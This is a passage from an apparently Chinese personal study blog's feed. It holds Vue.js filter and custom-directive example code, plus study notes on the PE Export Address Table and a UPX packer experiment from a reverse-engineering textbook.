class="token punctuation">;</span>    <span class="token property">height</span><span class="token punctuation">:</span>25px<span class="token punctuation">;</span>    <span class="token property">padding</span><span class="token punctuation">:</span> 5px<span class="token punctuation">;</span>    <span class="token property">background-color</span><span class="token punctuation">:</span> #006600<span class="token punctuation">;</span>    <span class="token property">color</span><span class="token punctuation">:</span> #fff<span class="token punctuation">;</span>    <span class="token property">margin-top</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span> <span class="token attr-name">v-for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>article in articles<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span> &#123;&#123;article.title&#125;&#125; 　<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>summary<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> &#123;&#123;article.summary|readMore(100, '...')&#125;&#125; <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>　　　　     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>more<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span><span class="token punctuation">></span></span>阅读更多<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>span</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>../../js/vue.js<span class="token punctuation">"</span></span><span class="token attr-name">"</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">   Vue<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token string">'readMore'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">text<span class="token punctuation">,</span> length<span class="token punctuation">,</span> suffix</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> text<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> length<span class="token punctuation">)</span> <span class="token operator">+</span> suffix   <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>   <span class="token keyword">let</span> app <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">el</span><span class="token operator">:</span> <span class="token string">'#app'</span><span class="token punctuation">,</span>    <span class="token function">data</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">return</span> <span class="token punctuation">&#123;</span>      <span class="token literal-property property">articles</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">&#123;</span>       <span class="token literal-property property">title</span><span class="token operator">:</span> <span class="token string">'Vue.js过滤器'</span><span class="token punctuation">,</span>       <span class="token literal-property property">summary</span><span class="token operator">:</span> <span class="token string">'过滤器本质上就是个函数，其作用在于用户在输入数据后，它能够进行处理，并返回一个处理结果。Vue.js提供了过滤器API，可以对数据进行过滤处理，并根据过滤的条件最终返回需要的结果。本章将会带你学习过滤器的注册及使用方法。'</span><span class="token punctuation">,</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">]</span>     <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="动态参数"><a href="#动态参数" class="headerlink" title="动态参数"></a>动态参数</h2><p>感觉就是个动态显示</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>../../js/vue.js<span class="token punctuation">"</span></span><span class="token attr-name">"</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Title<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>price<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>&#123;&#123;date|dynamic(price)&#125;&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">    Vue<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token string">'dynamic'</span><span class="token punctuation">,</span>        <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">date<span class="token punctuation">,</span> price</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> date<span class="token punctuation">.</span><span class="token function">toLocaleDateString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" : "</span> <span class="token operator">+</span> price<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>        <span class="token literal-property property">el</span><span class="token operator">:</span> <span class="token string">'#app'</span><span class="token punctuation">,</span>        <span class="token literal-property property">data</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token literal-property property">date</span><span class="token operator">:</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token literal-property property">price</span><span class="token operator">:</span> <span class="token number">150</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="自定义指令的注册和使用"><a href="#自定义指令的注册和使用" class="headerlink" title="自定义指令的注册和使用"></a>自定义指令的注册和使用</h2><p>自定义指令是用来操作DOM的，尽管Vue推崇数据驱动视图的理念，但是并非所有情况都适合数据驱动理念。自定义指令就是一种有效的补充和扩展,其不仅可用于定义任意DOM操作，还可以复用。</p><h3 id="自定义全局指令"><a href="#自定义全局指令" class="headerlink" title="自定义全局指令"></a>自定义全局指令</h3><p>自定义全局指令使用了<code>Vue.directive(指令ID，定义对象)</code>。定义对象是一个对象，这个对象上有一些指令相关的钩子函数，这些函数可以在特定的阶段执行相关的操作。</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span> <span class="token attr-name">v-red</span><span class="token punctuation">></span></span>使用自定义指令改变颜色<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>../../js/vue.js<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">   Vue<span class="token punctuation">.</span><span class="token function">directive</span><span class="token punctuation">(</span><span class="token string">'red'</span><span class="token punctuation">,</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">el</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    el<span class="token punctuation">.</span>style<span class="token punctuation">[</span><span class="token string">"color"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"red"</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>   <span class="token keyword">var</span> vm <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">el</span><span class="token operator">:</span> <span class="token string">'#app'</span><span class="token punctuation">,</span>    <span class="token literal-property property">data</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>         <span class="token punctuation">&#125;</span>   <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="钩子函数"><a href="#钩子函数" class="headerlink" title="钩子函数"></a>钩子函数</h2><p>除update与componentUpdated外，每个钩子函数都含有el、binding、vnode这三个参数。参数el就是指令绑定的DOM元素，而binding是一个对象，它包含name、value、oldvalue、expression、arg、modifiers等属性。除el之外，binding、vnode属性都是制度的。</p><table><thead><tr><th>名称</th><th>Description</th></tr></thead><tbody><tr><td>bind</td><td>只调用一次，指令第一次绑定到元素时调用。在此可以进行一次性的初始化设置</td></tr><tr><td>inserted</td><td>被绑定元素插入父节点时调用(仅保证父节点存在，但不一定已被插入文档)</td></tr><tr><td>update</td><td>所在组件的VNode更新时调用，但是可能发生在其子VNode更新之前。指令的值可能发生了改变，也可能没有发生改变</td></tr><tr><td>componentUpdated</td><td>指令所在组件的VNode及其子VNode全部更新后调用</td></tr><tr><td>unbind</td><td>只在指令与元素解绑时调用一次</td></tr></tbody></table><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span>  <span class="token attr-name"><span class="token namespace">v-parameter:</span>hello.a.b</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>message<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>../../js/vue.js<span class="token punctuation">"</span></span><span class="token attr-name">"</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/javascript<span class="token punctuation">"</span></span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">Vue<span class="token punctuation">.</span><span class="token function">directive</span><span class="token punctuation">(</span><span class="token string">'parameter'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>  <span class="token function-variable function">bind</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">el<span class="token punctuation">,</span> binding<span class="token punctuation">,</span> vnode</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">var</span> s <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span>stringify    el<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span>      <span class="token string">'name: '</span> <span class="token operator">+</span> <span class="token function">s</span><span class="token punctuation">(</span>binding<span class="token punctuation">.</span>name<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&lt;br>'</span> <span class="token operator">+</span>      <span class="token string">'value: '</span> <span class="token operator">+</span> <span class="token function">s</span><span class="token punctuation">(</span>binding<span class="token punctuation">.</span>value<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&lt;br>'</span> <span class="token operator">+</span>      <span class="token string">'expression: '</span> <span class="token operator">+</span> <span class="token function">s</span><span class="token punctuation">(</span>binding<span class="token punctuation">.</span>expression<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&lt;br>'</span> <span class="token operator">+</span>      <span class="token string">'argument: '</span> <span class="token operator">+</span> <span class="token function">s</span><span class="token punctuation">(</span>binding<span class="token punctuation">.</span>arg<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&lt;br>'</span> <span class="token operator">+</span>      <span class="token string">'modifiers: '</span> <span class="token operator">+</span> <span class="token function">s</span><span class="token punctuation">(</span>binding<span class="token punctuation">.</span>modifiers<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'&lt;br>'</span> <span class="token operator">+</span>      <span class="token string">'vnode keys: '</span> <span class="token operator">+</span> Object<span class="token punctuation">.</span><span class="token function">keys</span><span class="token punctuation">(</span>vnode<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">', '</span><span class="token punctuation">)</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  <span class="token literal-property property">el</span><span class="token operator">:</span> <span class="token string">'#app'</span><span class="token punctuation">,</span>  <span class="token literal-property property">data</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token literal-property property">message</span><span class="token operator">:</span> <span class="token string">'前端学习!'</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>效果</strong></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211115191243.png" alt="效果"></p>]]></content>
      
      
      <categories>
          
          <category> 研究生预备学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向工程核心原理-2-EAT</title>
      <link href="/2021/11/14/ni-xiang-gong-cheng-he-xin-yuan-li-2-eat/"/>
      <url>/2021/11/14/ni-xiang-gong-cheng-he-xin-yuan-li-2-eat/</url>
      
        <content type="html"><![CDATA[<h1 id="EAT"><a href="#EAT" class="headerlink" title="EAT"></a>EAT</h1><p>Windows操作系统中，“库”是为了方便其他程序调用而集中包含相关函数的文件(DLL/SYS)。Win32 API是最具代表性的库，其中的kernel32.dll文件被称为最核心的库文件。</p><p>EAT是一种核心机制，它使不同的应用程序可以调用库文件中提供的函数。也就是说，只有通过EAT才能准确求得相应库中导出函数的起始地址。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211114094826.png" alt="EAT"></p><p>从库中获得函数地址的API为<code>GetProcAddress</code>函数。该API引用EAT来获取指定API的地址。</p><h2 id="GetProcAddress操作原理"><a href="#GetProcAddress操作原理" class="headerlink" title="GetProcAddress操作原理"></a>GetProcAddress操作原理</h2><ol><li>利用AddressOfName成员转到“函数名称数组”</li></ol><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211114101014.png" alt="函数名称数组"></p><ol start="2"><li>函数名称数组中存储着字符串的地址。通过比较字符串，查找指定的函数名称(此时的数组索引成为name_index)</li></ol><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211114101732.png" alt="找到函数名称"></p><ol start="3"><li>利用AddressOfNameOrdinals成员转到orinal数组。</li></ol><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211114101919.png" alt="转到orinal数组"></p><ol start="4"><li>在ordinal数组中通过name_index查找到相应的ordinal值</li></ol><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211114102139.png" alt="找到ordinal的值"></p><ol start="5"><li>利用AddressOfFunctions成员转到“函数地址数组EAT”</li></ol><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211114102324.png" alt="转到EAT"></p><ol start="6"><li>利用刚刚求到的ordinal用作数组索引，获得指定函数的起始地址。</li></ol><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211114102451.png" alt="获得起始地址"></p><blockquote><p>kernel32.dll中所有导出函数均有相应名称，AddressOfNameOrdinals数组的值以index=ordinal的形式存在。但并不是所有的DLL文件都如此，导出函数中也有一些函数没有名称。</p></blockquote><hr><blockquote><p>对于没有函数名称的导出函数，可以通过ordinal查找到它们的地址。从Ordinal值中减去IMAGE_EXPORT_DIRECTORY.base成员后得到一个值。使用该值作为“函数地址数组”索引，即可查找到相应函数的地址。</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> 研究生预备学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程核心原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆向工程核心原理-2-运行时压缩测试</title>
      <link href="/2021/11/14/ni-xiang-gong-cheng-he-xin-yuan-li-3-yun-xing-shi-ya-suo-ce-shi/"/>
      <url>/2021/11/14/ni-xiang-gong-cheng-he-xin-yuan-li-3-yun-xing-shi-ya-suo-ce-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="运行时压缩测试"><a href="#运行时压缩测试" class="headerlink" title="运行时压缩测试"></a>运行时压缩测试</h1><p>运行时压缩器是针对PE文件而言的，可执行文件内部含有解压缩代码，文件在运行瞬间于内存中解压缩后执行。</p><h2 id="压缩器"><a href="#压缩器" class="headerlink" title="压缩器"></a>压缩器</h2><p><strong>使用目的</strong>: </p><ul><li>缩减PE文件大小</li><li>隐藏PE文件内部代码和资源</li></ul><h2 id="保护器"><a href="#保护器" class="headerlink" title="保护器"></a>保护器</h2><p><strong>使用目的</strong>：</p><ul><li>防止破解</li><li>保护代码与资源</li></ul><p>尤其游戏，防止你做外挂。</p><h2 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h2><p>就按照书上面给出的UPX压缩器做测试了。</p><p>具体的过程我是这么理解的，UPX给代码做了一个压缩，都放到<code>.UPX1</code>段中，加载入内存后，先运行<code>.UPX1段</code>中的解压缩代码，将文件中的压缩代码放到<code>.UPX0段</code>中。在解压缩过程完成后，跳转到源程序的执行入口执行程序。<br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211115113255.png" alt="UPX压缩后的结构对比"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211115111250.png" alt="压缩前后的PEview"></p><p>至于最后是否是还原成跟压缩前的程序一致(其他的代码段和结构等等)，这我就有点不太清楚了。用debug工具调试，最后确实跳转到了程序入口，该入口与调试源程序的入口保持一致。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211115111627.png" alt="debug工具调试"></p><blockquote><p>通过观察内存中的数据，对比发现，解压缩之后程序没有包含原来<code>.text</code>中的<code>IMPORT Hints/Names &amp; DLL Names</code><br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211115112308.png" alt="IMPORT Hints/Names &amp; DLL Names"><br><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20211115112433.png" alt="内存中的数据对比"></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 研究生预备学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 逆向工程核心原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>财经-基金-2</title>
      <link href="/2021/11/13/cai-jing-ji-jin-2/"/>
      <url>/2021/11/13/cai-jing-ji-jin-2/</url>
      
